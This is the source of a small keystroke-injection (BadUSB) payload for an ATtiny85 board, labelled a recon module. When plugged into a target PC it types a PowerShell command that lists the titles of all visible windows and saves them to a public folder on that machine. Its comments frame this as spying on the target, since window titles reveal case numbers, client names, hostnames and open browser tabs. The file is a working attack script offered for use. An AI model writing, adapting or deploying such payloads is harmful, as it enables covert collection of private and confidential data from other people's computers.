// recon/window-titles - Tier 2
//
// Titles of every visible window. The fastest situational-awareness win here.
//
// Window titles leak case numbers, client names, hostnames and whatever
// is currently in a browser tab. This is the payload most likely to tell
// you whether to stop what you are doing - run it early, not last.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "Add-Type -Name U -Namespace W -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool EnumWindows(EnumProc cb, IntPtr p); [DllImport(\"user32.dll\")] public static extern int GetWindowTextLength(IntPtr h); [DllImport(\"user32.dll\")] public static extern int GetWindowText(IntPtr h, System.Text.StringBuilder s, int n); [DllImport(\"user32.dll\")] public static extern bool IsWindowVisible(IntPtr h); public delegate bool EnumProc(IntPtr h, IntPtr p);'"
    "[W.U]::EnumWindows({param($h,$p) $n=[W.U]::GetWindowTextLength($h); if($n -gt 0 -and [W.U]::IsWindowVisible($h)){$s=New-Object System.Text.StringBuilder ($n+1);[void][W.U]::GetWindowText($h,$s,$n);Write-Host $s.ToString()}; return $true},[IntPtr]::Zero)"
    R_OUT("window-titles.txt")
    R_SHOW("window-titles.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
